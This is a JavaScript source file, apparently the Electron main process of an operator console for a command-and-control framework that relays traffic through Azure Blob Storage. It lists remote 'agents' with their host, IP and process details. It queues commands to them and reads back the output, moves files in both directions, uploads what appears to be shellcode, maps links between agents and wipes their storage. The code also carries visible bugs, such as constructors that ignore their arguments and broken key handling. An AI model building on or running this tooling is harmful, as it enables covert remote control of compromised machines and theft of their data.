const { app, BrowserWindow, ipcMain, Menu, clipboard, shell, screen, dialog, MenuItem } = require('electron');
const fs   = require('fs');  
const az   = require('./azure');
const { getAppDataDir } = require('./common');
const directories = getAppDataDir();
global.config = require(directories.configFilePath);
const agents = [];
let win;
global.agentids           = [];
global.agentwindows       = 0;
global.agentWindowHandles = {}; // Store windows by agentID
global.dashboardWindow    = null;
global.agents             = [];
global.haltUpdate         = false;

class Container 
{
  constructor(name, key = {}, blobs = {}) 
  {
    this.name = null || name;
    this.key = {} || key;
    this.blobs = {} || blobs;
  }
  setName(name) {
    this.name = name;
  }
  setKey(key) {
    this.key = {
      'key' : key.key,
      'iv' : key.iv
    };
  }
}

class Agent 
{
  constructor(agentId, containerObject) 
  {
    this.agentid   = null || agentId;
    this.container = null || containerObject;
    this.BrowserWindow = null;
  }
}

class Task {
    constructor(command) {
        this.outputChannel = 'o-' + Math.random().toString(36).substring(2, 14);
        this.command = command;
        this.taskid = Math.random().toString(36).substring(2, 14);
    }
}

function createDashboardWindow() {
    const primaryDisplay = screen.getPrimaryDisplay();
    const { width, height } = primaryDisplay.workAreaSize;
    
    global.dashboardWindow = new BrowserWindow({
        width: Math.floor(width * 0.76),
        height: Math.floor(height * 0.8),
        center: true,
        webPreferences: {
          contextIsolation: false,
          enableRemoteModule: true,
          nodeIntegration: true
        },
    });
    global.dashboardWindow.focus();
    global.dashboardWindow.loadFile('dashboard.html');
    console.log('Main window created');
}

async function createContainerWindow(thisagentid) {
    let exists = false;
    for (let i = 0; i < agents.length; i++) {
      if (agents[i].agentid === thisagentid)
      {
          console.log(`agent with agentid ${this_agent.agentid} already exists in agents[${i}]`);
          exists = true;
      }
    }
    if (!exists)
    {
        const primaryDisplay = screen.getPrimaryDisplay();
        const { width, height } = primaryDisplay.workAreaSize;
        const containerWin = new BrowserWindow({
            width: Math.floor(width * 0.6),
            height: Math.floor(height * 0.7),
            center: true,
            webPreferences: {
              contextIsolation: false,
              enableRemoteModule: true,
              nodeIntegration: true
            },
        });
        let agent_object = global.agents.find(agent => agent.agentid === thisagentid);
        global.agentWindowHandles[agent_object.agentid] = containerWin;
        global.agentwindows++;
        containerWin.loadFile('agent.html').then(() => {
            containerWin.webContents.send('container-data', agent_object);
        });
        console.log(`Container window created for container: ${agent_object.container}`);
        console.log(`Number of agent windows : ${global.agentwindows}`);

        containerWin.on('close', async (event) => {
            event.preventDefault(); 
            await containerWin.webContents.send('window-closing'); 
        });

        ipcMain.on('force-close', async (event,agentid) => {
            console.log(`kernel.js : IPC force-close`);
            console.log(`agentid   : ${agentid}`);
            if(agents.length > 0){
                for (let i = 0; i < agents.length; i++) {
                  if (agents[i].agentid === agentid)
                  {
                      agents.pop(agents[i]);
                      break;
                  }
                }
            }
            if (global.agentids.includes(agentid)) {
                console.log(`${agentid} removed from the array.`);
                global.agentids.pop(agentid);
            } 
            const agentWindow = global.agentWindowHandles[agentid];
            if (agentWindow) {
                agentWindow.destroy(); 
                delete global.agentWindowHandles[agentid]; 
                global.agentwindows--;
            }
            console.log(`agentids        : ${global.agentids}`);
            console.log(`agents.length   : ${agents.length}`);
            console.log(`agentids.length : ${global.agentids.length}`);
            console.log(`agentwindows    : ${global.agentwindows}`);
        });
    }
}

async function createExplorerWindow(thisagent) {
    const primaryDisplay = screen.getPrimaryDisplay();
    const { width, height } = primaryDisplay.workAreaSize;
    const ExplorerWin = new BrowserWindow({
        width: Math.floor(width * 0.6),
        height: Math.floor(height * 0.7),
        center: true,
        webPreferences: {
            contextIsolation: false,
            enableRemoteModule: true,
            nodeIntegration: true, 
        },
    });
    let this_agent = JSON.parse(thisagent);
    let agent_object = global.agents.find(agent => agent.agentid === this_agent.agentid);
    ExplorerWin.loadFile('explorer.html').then(() => {
        ExplorerWin.webContents.send('container-data', agent_object);
    });
    ExplorerWin.on('close', async (event) => {
    });
}

function openDownloadsExplorer() {
    shell.openPath(directories.downloadsDir);
}

function openAgentLogsExplorer() {
    shell.openPath(directories.logDir);
}

function openConfigWindow() {
    const configWindow = new BrowserWindow({
        width: 500,
        height: 400,
        title: "Configuration",
        parent: win,
        modal: true,
        webPreferences: {
            contextIsolation: false,
            enableRemoteModule: true,
            nodeIntegration: true
        },
    });
    configWindow.loadFile('settings.html');
}

ipcMain.handle('updateagent', async (event, agentid,newcontainerid) => {
    try
    {
        const newcontainer_blobs = await az.getContainerBlobs(newcontainerid);
        console.log(`${newcontainerid} container key blob : ${newcontainer_blobs['key']}`);
        let container_key,links  = await az.getContainerAesKeys(agentid);
        let checkinData          = await az.checkinContainer(newcontainerid, container_key,newcontainer_blobs);
        let agentObj             = JSON.parse(checkinData);
        agentObj.agentid         = agentid;
        agentObj.containerid     = newcontainerid;
        agentObj.key             = container_key['key'];
        agentObj.iv              = container_key['iv'];
        let startupdata          = JSON.stringify(agentObj);
        for (let i = 0; i < agents.length; i++) {
            if (agents[i].agentid === agentid)
            {
                JSON.stringify(agents[i]);
                agents[i].container.name = newcontainerid;
                agents[i].BrowserWindow.webContents.send('container-data', newcontainerid, container_key, newcontainer_blobs,startupdata);
                break;
            }
        }
    }catch(error)
    {
        console.log(`updateagent IPC kernel.js error : ${error} ${error.stack}`);
    }
});

ipcMain.on('upload-client-command-to-input-channel', async (event, agent_object) => {
    try {
        console.log(`kernel.js :  IPC "upload-client-command-to-input-channel`);
        let global_agent_object = global.agents.find(agent => agent.agentid === agent_object.agentid);
        let agent_task          = agent_object.tasks[agent_object.tasks.length - 1];
        global_agent_object.tasks.push(agent_task);

        let commandOutput = false;
        while (commandOutput === false) {
            commandOutput = await az.uploadCommand(agent_object);
            if (commandOutput === false) {
                await new Promise(resolve => setTimeout(resolve, 3000));
            }
        }
        console.log(`[KERNEL][IPC] command-output : ${commandOutput}`);
        let command_response = {
            'command' : agent_task.command,
            'taskid'  : agent_task.taskid,
            'output'  : commandOutput
        }
        event.reply('command-output', command_response);
    } catch (error) {
        console.error('Error uploading command to Azure Blob Storage:', error);
        event.reply('command-output', `Error: ${error.message}`); // Send error response
    }
});

ipcMain.handle('get-agent-links', async (event, agentid) => {
    try {
        console.log(`[KERNEL][IPC] get-agent-links : ${agentid}`);
        if(agentid == 0 || agentid == null || agentid == undefined || agentid == '')
        {
            return 0;
        }
        const [aesKeys, links] = await az.getContainerAesKeys(agentid);
        const agentlinks = links;
        console.log(`[KERNEL][IPC] get-agent-links : ${agentlinks}`);
        return agentlinks;
    } catch (error) {
      console.error('Error getting agent links:', error);
      return 0;
    }
});

ipcMain.on('pull-download-file', async (event, agent_object, filename, blob) => {
    try {
        if (filename.startsWith("'") && filename.endsWith("'")) {
            filename = filename.slice(1, -1);
        }
        if (filename.startsWith('"') && filename.endsWith('"')) {
            filename = filename.slice(1, -1);
        }
        await az.pullDownloadFile(agent_object,filename,blob);
    } catch (error) {
      console.error('Error uploading command to Azure Blob Storage:', error);
    }
});

ipcMain.on('upload-file-to-blob', async (event, agent_object, uploadfile, uploadblob) => {
    try {
        await az.uploadFileToAzure(agent_object, uploadblob, uploadfile);
        await global.agentWindowHandles[agent_object.agentid].webContents.send('send-upload-command', agent_object);
    } catch (error) {
        console.error('Error uploading command to Azure Blob Storage:', error);
    }
});

ipcMain.on('upload-sc-to-blob', async (event, agent_object, scfile, scblob) => {
    try {
        console.log(`[KERNEL][IPC] upload-sc-to-blob : ${scfile} ${scblob}`);
        await az.uploadSCToAzure(agent_object, scblob, scfile);
        await global.agentWindowHandles[agent_object.agentid].webContents.send('send-upload-command', agent_object);
    } catch (error) {
        console.error('Error uploading command to Azure Blob Storage:', error);
    }
});

ipcMain.handle('preload-agents', async () => {
    let blobs = await az.preloadContainers();
    return blobs;
});

ipcMain.handle('get-containers', async () => {
    if (global.haltUpdate == false)
    {
        let blobs = await az.updateDashboardTable();
        return blobs;
    }
    else
    {
        return 0;
    }
});

ipcMain.handle('get-agent-checkin', async (event, agentid) => {
    if (global.haltUpdate == false)
    {
        let thisAgent = global.agents.find(agent => agent.agentid === agentid); 
        let agentCheckin = await az.returnAgentCheckinInfo(thisAgent.agentid);
        thisAgent.checkin = agentCheckin;
        return JSON.stringify(thisAgent);
    }
    else { return 0; }
});

ipcMain.on('open-container-window', async (event, thisagentid) => {
    console.log(`IPC Open Container Window : ${thisagentid}`);
    let window_exists = false;
    if (global.agentwindows === 0) { global.agentids.length = 0; }
    console.log(`agentids[] : ${thisagentid}`);
    if (!global.agentids.includes(thisagentid)) {
      global.agentids.push(thisagentid);
        console.log(`${thisagentid} added to the array.`);
    } else {
        console.log(`${thisagentid} already exists.`);
        window_exists = true;
    }
    const agentWindow = global.agentWindowHandles[thisagentid];
    if (global.agentWindowHandles[thisagentid] !== undefined) 
    {
        window_exists = true;
        console.log(`window exists`);
        if (agentWindow && !agentWindow.isDestroyed()) {
            agentWindow.focus(); 
            return;
        }
    }
    if (window_exists == false)
    {
        setTimeout(() => { createContainerWindow(thisagentid) }, 1000); 
    }
});

ipcMain.on('execute-command', (event, command) => {
    console.log(`Executing command: ${command}`);
    const result = `Executed command: ${command}`;
    event.sender.send('command-result', result);
});

app.whenReady().then(() => {
    console.log('App is ready');
    createDashboardWindow();
    const menu = Menu.buildFromTemplate([
      {
          label: 'View',
          submenu: [
              {
                  label: 'Configuration',
                  click: () => {
                      openConfigWindow();
                  }
              },
              {
                  label: 'Downloads',
                  click: () => {
                      openDownloadsExplorer();
                  }
              },
              {
                  label: 'Agent Logs',
                  click: () => {
                      openAgentLogsExplorer();
                  }
              }
          ]
      },
      {
          label: 'Developer',
          submenu: [
              {
                  label: 'Toggle Developer Tools',
                  accelerator: 'CmdOrCtrl+Shift+I',
                  click: () => {
                      const focusedWindow = BrowserWindow.getFocusedWindow();
                      if (focusedWindow) {
                          focusedWindow.webContents.toggleDevTools();
                      }
                  }
              },
              {
                  label: 'Perform Command Test',
                  click: () => {
                      const focusedWindow = BrowserWindow.getFocusedWindow();
                      if (focusedWindow) {
                          focusedWindow.webContents.send('execute-test-command');
                      }
                  }
              },
              {
                  role: 'reload'
              }
          ]
      }
  ]);
Menu.setApplicationMenu(menu);
// Handle right-click context menu for table rows
ipcMain.on('show-row-context-menu', (event, agentsDataJSON) => {
        let agentsData = JSON.parse(agentsDataJSON);
        console.log(`[RIGHT-CLICK] agentsData : ${JSON.stringify(agentsData)}`);
        const agentid = agentsData[0].agentid;
        const contextMenu = Menu.buildFromTemplate([
            {
                label: 'Remove',
                click: async () => {
                    try {
                        global.haltUpdate = true;

                        // Handle agent window cleanup
                        if (global.agentWindowHandles[agentid]) {
                            try {
                                console.log(`Closing window for agent ID: ${agentid}`);
                                global.agentWindowHandles[agentid].destroy();
                                delete global.agentWindowHandles[agentid];
                                
                                for (let i = 0; i < agents.length; i++) {
                                    if (agents[i].agentid === agentid) {
                                        console.log(`Before pop : global.agentids[] : ${global.agentids}`);
                                        agents.pop(agents[i]);
                                        global.agentids.pop(agentid);
                                        console.log(`After pop  : global.agentids[] : ${global.agentids}`);
                                    }
                                }
                                global.agentwindows--;
                            } catch (windowError) {
                                console.log(`Error cleaning up agent window: ${windowError} ${windowError.stack}`);
                                global.haltUpdate = false;
                                return;
                            }
                        }

                        // Handle dashboard updates
                        if (global.dashboardWindow) {
                            try {
                                console.log(`dashboardWindow exists`);
                                console.log(`calling IPC remove-table row for ${agentid} agent`);
                                global.dashboardWindow.webContents.send('remove-table-row', agentid);
                            } catch (dashboardError) {
                                console.log(`[REMOVE][!] Error updating dashboard: \r\n${dashboardError}\r\n${dashboardError.stack}`);
                                global.haltUpdate = false;
                                return;
                            }
                        }
                        // Handle storage cleanup
                        try {
                            await az.DeleteStorageBlob(global.config.metaContainer, agentid);
                            await az.DeleteStorageContainer(agentsData[0].containerid);
                            
                            if (global.dashboardWindow) {
                                console.log(`dashboardWindow exists`);
                                console.log(`calling IPC remove-table row for ${agentid} agent`);
                                global.dashboardWindow.webContents.send('remove-table-row', agentid);
                            }
                        } catch (storageError) {
                            console.log(`[REMOVE][!] Error cleaning up storage: \r\n${storageError}\r\n${storageError.stack}`);
                            global.haltUpdate = false;
                            return;
                        }
                        global.haltUpdate = false;
                    } catch (error) {
                        console.log(`[REMOVE][!] Unexpected error in remove operation: \r\n${error}\r\n${error.stack}`);
                        global.haltUpdate = false;
                    }
                }
            },
            {
                label: 'Explorer',
                click: () => {
                    console.log(`Explorer clicked for agent ID: ${agentid}`);
                    createExplorerWindow(JSON.stringify(agentsData[0]));
                }
            },
            {
                label: 'Links',
                visible: agentsData[0].mode && agentsData[0].mode.startsWith('link'),
                click: () => {
                    console.log(`Links clicked for agent ID: ${agentid}`);
                    const primaryDisplay = screen.getPrimaryDisplay();
                    const { width: screenWidth, height: screenHeight } = primaryDisplay.workAreaSize;
                    console.log(`Screen dimensions - Width: ${screenWidth}, Height: ${screenHeight}`);
                    
                    // Calculate window dimensions
                    const numAgents = agentsData.length + 1; // Add 1 for the Azure storage card
                    const headerHeight = 150;  // Height for window title bar and header
                    const heightPerAgent = 528;  // Height per agent card
                    const arrowSpacing = 10;  // Space between arrow and next card
                    const calculatedHeight = headerHeight + (numAgents * heightPerAgent) + ((numAgents - 1) * arrowSpacing);
                    const maxHeight = Math.floor(screenHeight * 0.9);
                    console.log(`Calculated height: ${calculatedHeight}, Max height: ${maxHeight}`);
                    
                    const totalHeight = Math.min(calculatedHeight, maxHeight);
                    const width = Math.min(
                        Math.max(600, screenWidth * 0.6),
                        800
                    );
                    
                    const linksWindow = new BrowserWindow({
                        width: width,
                        height: totalHeight,
                        minWidth: 600,
                        minHeight: 400,
                        webPreferences: {
                            contextIsolation: false,
                            nodeIntegration: true
                        }
                    });
                    linksWindow.loadFile('links.html');
                    linksWindow.webContents.on('did-finish-load', () => {
                        // Add Azure storage account info to the agentsData
                        const azureData = {
                            hostname: global.config.storageAccount,
                            platform: "Azure Storage Account",
                            username: "",
                            fileName: "",
                            containerid: "",
                            IP: "",
                            PID: "",
                            arch: "",
                            mode: "",
                            agentid: ""
                        };
                        agentsData.push(azureData);
                        linksWindow.webContents.send('agent-links', agentsData);
                    });
                }
            }
        ]);
      contextMenu.popup(BrowserWindow.fromWebContents(event.sender));
    });
      // Right-click Context Menu
      ipcMain.on('show-context-menu', (event) => {
          const contextMenu = Menu.buildFromTemplate([
              { label: 'Undo', role: 'undo' },
              { label: 'Redo', role: 'redo' },
              { type: 'separator' },
              { label: 'Cut', role: 'cut' },
              { label: 'Copy', role: 'copy' },
              { label: 'Paste', role: 'paste' },
              { type: 'separator' },
              { label: 'Select All', role: 'selectAll' }
          ]);
          contextMenu.popup(BrowserWindow.fromWebContents(event.sender));
    });

    // Fix for macOS Clipboard Shortcuts
    ipcMain.on('copy', async (event) => {
        const focusedWindow = BrowserWindow.getFocusedWindow();
        if (focusedWindow) {
            const selectedText = await focusedWindow.webContents.executeJavaScript('window.getSelection().toString()');
            clipboard.writeText(selectedText);
        }
    });

    ipcMain.on('cut', async (event) => {
        const focusedWindow = BrowserWindow.getFocusedWindow();
        if (focusedWindow) {
            const selectedText = await focusedWindow.webContents.executeJavaScript('window.getSelection().toString()');
            clipboard.writeText(selectedText);
            focusedWindow.webContents.executeJavaScript('document.execCommand("cut")');
        }
    });

    ipcMain.on('paste', (event) => {
        const focusedWindow = BrowserWindow.getFocusedWindow();
        if (focusedWindow) {
            focusedWindow.webContents.paste();
        }
    });

    ipcMain.on('update-config', (event, newConfig) => {
        const configPath = directories.configFilePath;
        fs.writeFileSync(configPath, `module.exports = ${JSON.stringify(newConfig, null, 4)};`);
        console.log("Configuration updated:", newConfig);
        global.config    = newConfig;
    });

});

app.on('window-all-closed', () => {
    app.quit();
});

app.on('activate', () => {
    if (BrowserWindow.getAllWindows().length === 0) {
        createDashboardWindow();
    }
});